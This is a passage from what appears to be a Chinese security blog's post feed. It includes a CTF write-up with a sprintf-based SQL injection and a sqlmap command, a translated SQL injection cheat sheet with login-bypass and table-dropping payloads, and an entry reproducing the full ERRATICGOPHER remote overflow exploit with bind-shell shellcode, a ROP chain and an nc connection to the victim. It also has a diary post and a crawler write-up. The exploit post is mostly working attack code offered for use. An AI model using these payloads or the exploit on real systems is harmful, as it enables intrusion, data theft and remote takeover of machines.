        <content type="html"><![CDATA[<p>一道注入题，登录页面。</p><p>试了常见的万能密码，无效，不存在弱口令。</p><p>使用BP，看下过滤了哪些字符。</p><a id="more"></a><p><img src="/2018/09/10/ichunqiu-web-SQLi/bp-1.png" alt="BP-1"></p><p>发现参数含有<code>%</code>时，报错。</p><p><img src="/2018/09/10/ichunqiu-web-SQLi/sqli-1.png" alt="SQLi-1"></p><p>提示 <code>Warning: sprintf(): Too few arguments in /var/www/html/index.php on line 18</code>，根据提示，判定可能存在<code>sprintf格式化字符串漏洞</code>。</p><p>看下<code>sprintf</code>函数的描述。</p><p><img src="/2018/09/10/ichunqiu-web-SQLi/info-1.png" alt="Info-1"></p><p>可以构造payload:<code>admin %1$&#39; or 1=1 #</code>，顶掉占位符，注入sql语句。此处，提示<code>password error!</code></p><p>此处不回显内容，但是有错误提示，只能盲注。</p><p>可以直接用<code>sqlmap</code>跑出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://b968f913d88e4ce5b916d5f6a2badf2e4568f7626bc84863.game.ichunqiu.com/&quot; --data &quot;username=admin%1$&apos; * #&amp;password=12345&quot; --no-cast -p username --level 3 -T B -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure><p><img src="/2018/09/10/ichunqiu-web-SQLi/sqli-2.png" alt="SQLi-2"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.colabug.com/4099484.html" target="_blank" rel="noopener">php中利用格式化字符串漏洞绕过addslashes注入</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> i春秋 </tag>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>日常心路-180909</title>
      <link href="/2018/09/09/daily-life-20180909/"/>
      <url>/2018/09/09/daily-life-20180909/</url>
      
        <content type="html"><![CDATA[<p>最近忙了很多事，从公司离职，搬家，开学，又跑到某市做培训。</p><p>突然回到校园生活，身份从社会人变成学生，感觉还有点不适应。</p><p>今天，如愿以偿的通过了<code>Syclover</code>的面试，进入了新芽组，应该是唯一一个大三的新芽 ( ╯□╰ )，不过也算是完成了高中时候的心愿（进入CUIT，进入Syclover）。今天面的师傅很严肃，感觉自己确实还差的太多了，希望能在这个学期努力跟上。</p><p>这个学期，需要额外补<code>3</code>门课，把四级过了，还要尽量通过核心组面试，任务挺重的⊙﹏⊙∥。</p><p>诸君共勉吧(ﾉ*･ω･)ﾉ。</p><p><img src="/2018/09/09/daily-life-20180909/jldnydhgjxzpmdzj.jpg" alt="表情"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 心路 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SQL注入备忘录</title>
      <link href="/2018/08/07/sql-injection-cheat-sheet/"/>
      <url>/2018/08/07/sql-injection-cheat-sheet/</url>
      
        <content type="html"><![CDATA[<p>转自：<a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><h3 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h3><ul><li><p><code>--</code> (MySQL | SQLServer)</p><p>DROP sample; –</p></li><li><p><code>#</code> (MySQL)</p><p>DROP sample; #</p></li></ul><h4 id="Sample"><a href="#Sample" class="headerlink" title="Sample"></a>Sample</h4><ul><li><p>Username: admin’–</p></li><li><p>SELECT * FROM members WHERE username = ‘admin’–’ AND password = ‘password’ </p></li></ul><a id="more"></a><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><p>  注释掉查询的多余部分，而不是直接截断关闭，可以通过这种方法绕过黑名单、替代空格，混淆，检测数据库版本。</p><ul><li><p>/*Comment Here*/ (MySQL | SQL Server)</p><pre><code>1. DROP/*comment*/sampletable2. DR/**/OP/*bypass blacklisting*/sampletable3. SELECT/*avoid-spaces*/password/**/FROM/**/Members</code></pre></li><li><p>/*! MySQL Special SQL */ (MySQL) </p><p>   这是MySQL特有的语法，可以用来检测数据库版本，如果在注释中注入代码，它会在数据库中被执行。 </p><ol><li>SELECT /<em>!32302 1/0, </em>/ 1 FROM tablename</li></ol></li></ul><h4 id="Sample-1"><a href="#Sample-1" class="headerlink" title="Sample"></a>Sample</h4><ul><li><p>ID: 10; DROP TABLE members /* </p></li><li><p>SELECT /*!32302 1/0, */ 1 FROM tablename </p><p>如果数据库版本大于<code>3.23.02</code>会报错。</p></li></ul><h2 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h2><p>  可以在一次事务中，执行多个查询。</p><ul><li><p><code>;</code> (SQL Server)</p><p>SELECT * FROM members; DROP members–</p></li></ul><h2 id="If-语句"><a href="#If-语句" class="headerlink" title="If 语句"></a>If 语句</h2><p>  通过IF语句，判断响应的内容，可以进行盲注。</p><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><ul><li><p>IF(condition,true-part,false-part) </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">IF</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="string">'true'</span>,<span class="string">'false'</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h3><ul><li><p>IF condition true-part ELSE false-part</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF (1=1) <span class="keyword">SELECT</span> <span class="string">'true'</span> <span class="keyword">ELSE</span> <span class="keyword">SELECT</span> <span class="string">'false'</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">IF</span> condition <span class="keyword">THEN</span> <span class="literal">true</span>-part; </span><br><span class="line">ELSE false-part;</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">IF</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"></span><br><span class="line">IF (1=1) THEN dbms_lock.sleep(3);</span><br><span class="line">ELSE dbms_lock.sleep(0);</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">IF</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure><h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h3>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> condition <span class="keyword">THEN</span> <span class="literal">true</span>-part <span class="keyword">ELSE</span> <span class="literal">false</span>-part <span class="keyword">END</span>;</span><br></pre></td></tr></table></figure>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> WEHEN (<span class="number">1</span>=<span class="number">1</span>) <span class="keyword">THEN</span> <span class="string">'A'</span> <span class="keyword">ELSE</span> <span class="string">'B'</span><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure><h4 id="Sample-2"><a href="#Sample-2" class="headerlink" title="Sample"></a>Sample</h4>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((<span class="keyword">select</span> <span class="keyword">user</span>) = <span class="string">'sa'</span> <span class="keyword">OR</span> (<span class="keyword">select</span> <span class="keyword">user</span>) = <span class="string">'dbo'</span>) <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">else</span> <span class="keyword">select</span> <span class="number">1</span>/<span class="number">0</span> (S)</span><br></pre></td></tr></table></figure><p>  如果当前账号不是<code>sa</code>或<code>dbo</code>，会报 <code>divide by zero error</code> 错误。</p><h2 id="使用整型"><a href="#使用整型" class="headerlink" title="使用整型"></a>使用整型</h2><p>  可以用来绕过<code>magic_quotes()</code>等过滤器，甚至是<code>WAF</code></p><ul><li><p>0xHEXNUMBER (MySQL | SQL Server)<br>You can  write hex like these; </p></li><li><p>SELECT CHAR(0x66) (SQL Server) </p></li><li><p>SELECT 0x5045 (这里不是数值，而是从hex转换来的字符) (MySQL) </p></li><li><p>SELECT 0x50 + 0x45 (这里是数值) (MySQL)</p></li></ul><h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><h3 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h3><ul><li><p><code>+</code> (SQL Server)</p><p>SELECT login + ‘-‘ + password FROM members</p></li><li><p><code>||</code> (MySQL | Oracle)</p><p>SELECT login || ‘-‘ || password FROM members</p><pre><code>如果MySQL在ANSI模式下运行，它被当作逻辑运算符，而返回0。更好的方法是，使用 CONCAT()</code></pre></li></ul><ul><li><p>CONCAT(str1,str2,…) (MySQL)</p><p>SELECT CONCAT(login, password) FROM members</p></li></ul><h2 id="无引号字符串"><a href="#无引号字符串" class="headerlink" title="无引号字符串"></a>无引号字符串</h2><ul><li><p>0x457578 (MySQL)</p><p>SELECT 0x457578</p><p>这里的十六进制数字会返回一个字符串。</p><p>MySQL有HEX()函数，可以生成hex，像下面一样。</p><p>SELECT CONCAT(‘0x’,HEX(‘c:\boot.ini’))</p></li><li><p>SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77)) (MySQL) </p><p>将会返回’KLM’</p></li><li><p>SELECT CHAR(75)+CHAR(76)+CHAR(77) (SQL Server) </p><p>将会返回’KLM’</p></li><li><p>SELECT CHR(75)||CHR(76)||CHR(77) (Oracle) </p><p>将会返回’KLM’</p></li><li><p>SELECT (CHaR(75)||CHaR(76)||CHaR(77)) (Postgresql) </p><p>将会返回’KLM’</p></li></ul><h4 id="Samples"><a href="#Samples" class="headerlink" title="Samples"></a>Samples</h4><p>  SELECT LOAD_FILE(0x633A5C626F6F742E696E69) (MySQL) </p><p>  This will show the content of c:\boot.ini</p><h2 id="字符串修改"><a href="#字符串修改" class="headerlink" title="字符串修改"></a>字符串修改</h2><ul><li><p>ASCII() (SQL Server | MySQL | Postgresql)</p><p>返回字符的ASCII码</p></li><li><p>CHAR() (SQL Server | MySQL)</p><p>返回ASCII码对应的字符</p></li></ul><h2 id="UNION-联合查询注入"><a href="#UNION-联合查询注入" class="headerlink" title="UNION 联合查询注入"></a>UNION 联合查询注入</h2><p>  可以通过<code>unin</code>进行跨表查询。</p><pre><code>1. SELECT header, txt FROm news UNION ALL SELECT name, pass FROM members2. &apos; UNION SELECT 1, &apos;anotheruser&apos;, &apos;doesnt matter&apos;, 1--</code></pre><h3 id="UNION-关于语言的问题的修复"><a href="#UNION-关于语言的问题的修复" class="headerlink" title="UNION - 关于语言的问题的修复"></a>UNION - 关于语言的问题的修复</h3><p>  在使用联合注入时，有时会因为不同的语言设置（表设置、字段设置、组合表/db设置等）而出现错误。这不常见，但如果你处理的是日语、俄语、土耳其语等应用，你就会遇到它。</p><ul><li><p>SQL Server</p><p>使用 <code>field</code> <strong><code>COLLATE</code></strong> <code>SQL_Latin1_General_Cp1254_CS_AS</code> 或其它有效参数</p></li><li><p>MySQL</p><p><code>Hex()</code></p></li></ul><h2 id="绕过登录点"><a href="#绕过登录点" class="headerlink" title="绕过登录点"></a>绕过登录点</h2><p>可以尝试以下：</p><ul><li><p>admin’ –</p></li><li><p>admin’ #</p></li><li><p>admin’/*</p></li><li><p>‘ or 1=1–</p></li><li><p>‘ or 1=1#</p></li><li><p>‘ or 1=1/*</p></li><li><p>‘) or ‘1’=’1–</p></li><li><p>‘) or (‘1’=’1–c</p></li><li><p>登录到其它用户 (MySQL | SQL Server)</p><p>‘ UNION SELECT 1, ‘anotheruser’, ‘doesnt matter’, 1–</p></li></ul><h2 id="绕过密码MD5验证的登录点"><a href="#绕过密码MD5验证的登录点" class="headerlink" title="绕过密码MD5验证的登录点"></a>绕过密码MD5验证的登录点</h2><p>  可以通过联合查询，提交一个已知密码的MD5，这时候，数据库会优先比较你提交的MD5，从而绕过登录。</p><blockquote><p>Username :<br>admin’ AND 1=0 UNION ALL SELECT ‘admin’, ‘81dc9bdb52d04dc20036dbd8313ed055’<br>Password : 1234</p></blockquote><h2 id="通过报错发现字段名"><a href="#通过报错发现字段名" class="headerlink" title="通过报错发现字段名"></a>通过报错发现字段名</h2><h3 id="使用-HAVING-BY-MySQL"><a href="#使用-HAVING-BY-MySQL" class="headerlink" title="使用 HAVING BY (MySQL)"></a>使用 <code>HAVING BY</code> (MySQL)</h3><ul><li><p>‘ HAVING 1=1 –</p></li><li><p>‘ GROUP BY table.columnfromerror1 HAVING 1=1 –</p></li><li><p>‘ GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 –</p></li><li><p>‘ GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 – 依次类推</p></li></ul><h3 id="使用-ORDER-BY"><a href="#使用-ORDER-BY" class="headerlink" title="使用 ORDER BY (*)"></a>使用 <code>ORDER BY</code> (*)</h3>]]></content>
      
      
      
        <tags>
            
            <tag> sql-injection </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>远程溢出之古怪地鼠ERRATICGOPHER</title>
      <link href="/2018/08/02/exploit-erraticgopher/"/>
      <url>/2018/08/02/exploit-erraticgopher/</url>
      
        <content type="html"><![CDATA[<p>ERRATICGOPHER是NSA泄露的针对<code>RRAS（Routing and Remote Access Service）</code>服务的攻击程序，影响<code>Windows XP</code> <code>Windows 2003</code>，此漏洞在<code>Vista</code>发布之前已经被修复。</p><a id="more"></a><p>附<code>EXPLOIT</code>，来自<a href="https://github.com/offensive-security/exploit-database/blob/d304cc3d3ef22bd6e5bccdeb6c13720345bbfc0c/exploits/windows/remote/41929.py" target="_blank" rel="noopener">exploit-db</a></p><blockquote><p>需要安装<code>impacket</code>模块</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">from threading import Thread    </span><br><span class="line">                                </span><br><span class="line">from impacket import smb</span><br><span class="line">from impacket import uuid</span><br><span class="line">from impacket import dcerpc</span><br><span class="line">from impacket.dcerpc.v5 import transport</span><br><span class="line">                </span><br><span class="line">target = sys.argv[1]</span><br><span class="line"></span><br><span class="line">print &apos;[-]Initiating connection&apos;</span><br><span class="line">trans = transport.DCERPCTransportFactory(&apos;ncacn_np:%s[\\pipe\\browser]&apos; % target)</span><br><span class="line">trans.connect()</span><br><span class="line"></span><br><span class="line">print &apos;[-]connected to ncacn_np:%s[\\pipe\\browser]&apos; % target</span><br><span class="line">dce = trans.DCERPC_class(trans)</span><br><span class="line">#RRAS DCE-RPC CALL</span><br><span class="line">dce.bind(uuid.uuidtup_to_bin((&apos;8f09f000-b7ed-11ce-bbd2-00001a181cad&apos;, &apos;0.0&apos;)))</span><br><span class="line"></span><br><span class="line">egghunter = &quot;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a&quot;</span><br><span class="line">egghunter += &quot;\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;</span><br><span class="line"></span><br><span class="line">#msfvenom -a x86 --platform windows -p windows/shell_bind_tcp lport=4444 -b &quot;\x00&quot; -f python</span><br><span class="line">buf =  &quot;&quot;</span><br><span class="line">buf += &quot;\xb8\x3c\xb1\x1e\x1d\xd9\xc8\xd9\x74\x24\xf4\x5a\x33&quot;</span><br><span class="line">buf += &quot;\xc9\xb1\x53\x83\xc2\x04\x31\x42\x0e\x03\x7e\xbf\xfc&quot;</span><br><span class="line">buf += &quot;\xe8\x82\x57\x82\x13\x7a\xa8\xe3\x9a\x9f\x99\x23\xf8&quot;</span><br><span class="line">buf += &quot;\xd4\x8a\x93\x8a\xb8\x26\x5f\xde\x28\xbc\x2d\xf7\x5f&quot;</span><br><span class="line">buf += &quot;\x75\x9b\x21\x6e\x86\xb0\x12\xf1\x04\xcb\x46\xd1\x35&quot;</span><br><span class="line">buf += &quot;\x04\x9b\x10\x71\x79\x56\x40\x2a\xf5\xc5\x74\x5f\x43&quot;</span><br><span class="line">buf += &quot;\xd6\xff\x13\x45\x5e\x1c\xe3\x64\x4f\xb3\x7f\x3f\x4f&quot;</span><br><span class="line">buf += &quot;\x32\x53\x4b\xc6\x2c\xb0\x76\x90\xc7\x02\x0c\x23\x01&quot;</span><br><span class="line">buf += &quot;\x5b\xed\x88\x6c\x53\x1c\xd0\xa9\x54\xff\xa7\xc3\xa6&quot;</span><br><span class="line">buf += &quot;\x82\xbf\x10\xd4\x58\x35\x82\x7e\x2a\xed\x6e\x7e\xff&quot;</span><br><span class="line">buf += &quot;\x68\xe5\x8c\xb4\xff\xa1\x90\x4b\xd3\xda\xad\xc0\xd2&quot;</span><br><span class="line">buf += &quot;\x0c\x24\x92\xf0\x88\x6c\x40\x98\x89\xc8\x27\xa5\xc9&quot;</span><br><span class="line">buf += &quot;\xb2\x98\x03\x82\x5f\xcc\x39\xc9\x37\x21\x70\xf1\xc7&quot;</span><br><span class="line">buf += &quot;\x2d\x03\x82\xf5\xf2\xbf\x0c\xb6\x7b\x66\xcb\xb9\x51&quot;</span><br><span class="line">buf += &quot;\xde\x43\x44\x5a\x1f\x4a\x83\x0e\x4f\xe4\x22\x2f\x04&quot;</span><br><span class="line">buf += &quot;\xf4\xcb\xfa\xb1\xfc\x6a\x55\xa4\x01\xcc\x05\x68\xa9&quot;</span><br><span class="line">buf += &quot;\xa5\x4f\x67\x96\xd6\x6f\xad\xbf\x7f\x92\x4e\xae\x23&quot;</span><br><span class="line">buf += &quot;\x1b\xa8\xba\xcb\x4d\x62\x52\x2e\xaa\xbb\xc5\x51\x98&quot;</span><br><span class="line">buf += &quot;\x93\x61\x19\xca\x24\x8e\x9a\xd8\x02\x18\x11\x0f\x97&quot;</span><br><span class="line">buf += &quot;\x39\x26\x1a\xbf\x2e\xb1\xd0\x2e\x1d\x23\xe4\x7a\xf5&quot;</span><br><span class="line">buf += &quot;\xc0\x77\xe1\x05\x8e\x6b\xbe\x52\xc7\x5a\xb7\x36\xf5&quot;</span><br><span class="line">buf += &quot;\xc5\x61\x24\x04\x93\x4a\xec\xd3\x60\x54\xed\x96\xdd&quot;</span><br><span class="line">buf += &quot;\x72\xfd\x6e\xdd\x3e\xa9\x3e\x88\xe8\x07\xf9\x62\x5b&quot;</span><br><span class="line">buf += &quot;\xf1\x53\xd8\x35\x95\x22\x12\x86\xe3\x2a\x7f\x70\x0b&quot;</span><br><span class="line">buf += &quot;\x9a\xd6\xc5\x34\x13\xbf\xc1\x4d\x49\x5f\x2d\x84\xc9&quot;</span><br><span class="line">buf += &quot;\x6f\x64\x84\x78\xf8\x21\x5d\x39\x65\xd2\x88\x7e\x90&quot;</span><br><span class="line">buf += &quot;\x51\x38\xff\x67\x49\x49\xfa\x2c\xcd\xa2\x76\x3c\xb8&quot;</span><br><span class="line">buf += &quot;\xc4\x25\x3d\xe9&quot;</span><br><span class="line"></span><br><span class="line">#NX disable routine for Windows Server 2003 SP2</span><br><span class="line">rop = &quot;\x30\xdb\xc0\x71&quot; #push esp, pop ebp, retn ws_32.dll</span><br><span class="line">rop += &quot;\x45&quot;*16</span><br><span class="line">rop += &quot;\xe9\x77\xc1\x77&quot; #push esp, pop ebp, retn 4 gdi32.dll</span><br><span class="line">rop += &quot;\x5d\x7a\x81\x7c&quot; #ret 20</span><br><span class="line">rop += &quot;\x71\x42\x38\x77&quot; #jmp esp</span><br><span class="line">rop += &quot;\xf6\xe7\xbd\x77&quot; #add esp,2c ; retn msvcrt.dll</span><br><span class="line">rop += &quot;\x90&quot;*2 + egghunter + &quot;\x90&quot;*42</span><br><span class="line">rop += &quot;\x17\xf5\x83\x7c&quot; #Disable NX routine</span><br><span class="line">rop += &quot;\x90&quot;*4</span><br><span class="line"></span><br><span class="line">stub = &quot;\x21\x00\x00\x00\x10\x27\x00\x00\x30\x07\x00\x00\x00\x40\x51\x06\x04\x00\x00\x00\x00\x85\x57\x01\x30\x07\x00\x00\x08\x00\x00\x00&quot; #Magic bytes</span><br><span class="line">stub += &quot;\x41&quot;*20 + rop + &quot;\xCC&quot;*100 + &quot;w00tw00t&quot; + buf + &quot;\x42&quot;*(1313-20-len(rop)-100-8-len(buf))</span><br><span class="line">stub += &quot;\x12&quot; #Magic byte</span><br><span class="line">stub += &quot;\x46&quot;*522</span><br><span class="line">stub += &quot;\x04\x00\x00\x00\x00\x00\x00\x00&quot; #Magic bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dce.call(0x1d, stub)   #0x1d MIBEntryGet (vulnerable function)</span><br><span class="line">print &quot;[-]Exploit sent to target successfully...&quot;</span><br><span class="line"></span><br><span class="line">print &quot;Waiting for shell...&quot;</span><br><span class="line">time.sleep(5)</span><br><span class="line">os.system(&quot;nc &quot; + target + &quot; 4444&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> EXPLOIT </tag>
            
            <tag> SMB </tag>
            
            <tag> 远程溢出 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>爬虫之批量下载Admin5源码</title>
      <link href="/2018/08/01/crawl-admin5/"/>
      <url>/2018/08/01/crawl-admin5/</url>
      
        <content type="html"><![CDATA[<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p><a href="http://down.admin5.com" target="_blank" rel="noopener"><code>Admin5</code></a> 提供了各种语言的开源项目，包括<code>asp</code> <code>php</code> <code>.net</code> <code>jsp</code>等。最近开始玩代码审计，到处找项目很麻烦，所以打算写一个爬虫，借助Admin5批量下载各类开源项目。</p><a id="more"></a><h2 id="分析页面"><a href="#分析页面" class="headerlink" title="分析页面"></a>分析页面</h2><p>首先，分析下<code>Admin5</code>的页面。</p><p><img src="/2018/08/01/crawl-admin5/screenshot-1.png" alt="截图-1"></p><p>可以看到，页面数据直接在html中显示的，并不是JS渲染上去的，这就比较好爬了。在响应的请求中，页面用的是<code>gb2312</code>编码，打印的时候需要注意一下，不然会乱码。建议设置编码为<code>gbk</code>，因为<code>gb2312</code>的支持的字没有<code>gbk</code>多，像打印<code>囧</code>的时候，就会抛异常。</p><p>首页的地址是<code>http://down.admin5.com/php/</code>，往后翻页，再看看首页的地址。</p><p><img src="/2018/08/01/crawl-admin5/screenshot-2.png" alt="截图-2"></p><p>变成了<code>http://down.admin5.com/php/list_30_1.html</code>。</p><p>那么就可以得出页面的地址规则 <code>php/list_30_页码.html</code>。</p><p><img src="/2018/08/01/crawl-admin5/screenshot-3.png" alt="截图-3"></p><p>这里使用<code>XPATH表达式</code>可以很方便的获取页面数据，<code>//div[@class=&quot;lists_bigimg_right&quot;]/a</code>，获取当前页所有项目详情的 <code>a</code> 标签，即详情页的地址。</p><p>随便进入一个项目的详情，找到下载地址。</p><p><img src="/2018/08/01/crawl-admin5/screenshot-4.png" alt="截图-4"></p><p>使用 XPATH : <code>//ul[@class=&quot;down-anniu&quot;]//li/a/@href</code>，获取下载地址，这条XPATH是获取所有的下载点地址，实际用不到这么多，可以修改下 <code>//ul[@class=&quot;down-anniu&quot;]/li[1]/a/@href</code>，只获取1条。</p><p>当然，这个页面还包含了其它的数据，同样可以用 XPATH 采集，就不详细写了，后面在代码中会有。</p><h2 id="运行流程"><a href="#运行流程" class="headerlink" title="运行流程"></a>运行流程</h2><p>下面梳理下我们爬虫的运行流程。</p><ol><li><p>访问<code>http://down.admin5.com/php/</code>，<code>asp</code>,<code>.net</code>等语言项目的页面其实是一样的，改下路径就行，这里以<code>php</code>的为例。</p></li><li><p>获取后续页面的地址，即下一页。由于<code>Admin5</code>的页面比较简单，可以直接获取总页数，然后用<code>for</code>循环，遍历<code>http://down.admin5.com/php/list_30_页码.html</code>。</p></li><li><p>获取每个项目的详细页地址，并跟进。</p></li><li><p>提取项目的详细参数，获取下载地址，加入下载队列。</p></li><li><p>下载模块不断取出队列的任务，下载项目，直到队列为空。</p></li></ol><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><p>这个项目比较简单，所以没有用<code>scrapy</code>等很重的框架去做。就用最简单的<code>requests</code>库去实现，下面设计一下具体的业务模型。</p><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><ol><li>ProjectItem<ul><li>name</li><li>size</li><li>update_date</li><li>official_url</li><li>download_url</li></ul></li></ol><p>这个模型包含每个项目的属性，包括项目名称，大小，更新日期，官方地址，下载地址。</p><ol start="2"><li>Downloader<ul><li>download_queue</li><li>cache_path</li><li>save_path</li><li>add_task(projcet_item)</li><li>print_progress()</li><li>save_cache()</li></ul></li></ol><p>下载器，这个模型负责下载项目，维护下载队列，监控下载进度，并对下载过的项目地址做缓存，防止重复下载。</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>已上传到 <a href="https://github.com/CHN-Jaylin/Spider/tree/master/admin5" target="_blank" rel="noopener">Github</a>， 具体实现请查看代码，注释已经写的比较清楚了。</p><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p><img src="/2018/08/01/crawl-admin5/screenshot-5.png" alt="截图-5"></p><p>已经实现了自动保存下载进度，可以随时<code>Ctrl+C</code>退出程序，下次执行时会跳过已下载的项目。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>昨天，明天</title>
      <link href="/2018/07/31/yesterday-and-tomorrow/"/>
      <url>/2018/07/31/yesterday-and-tomorrow/</url>
      
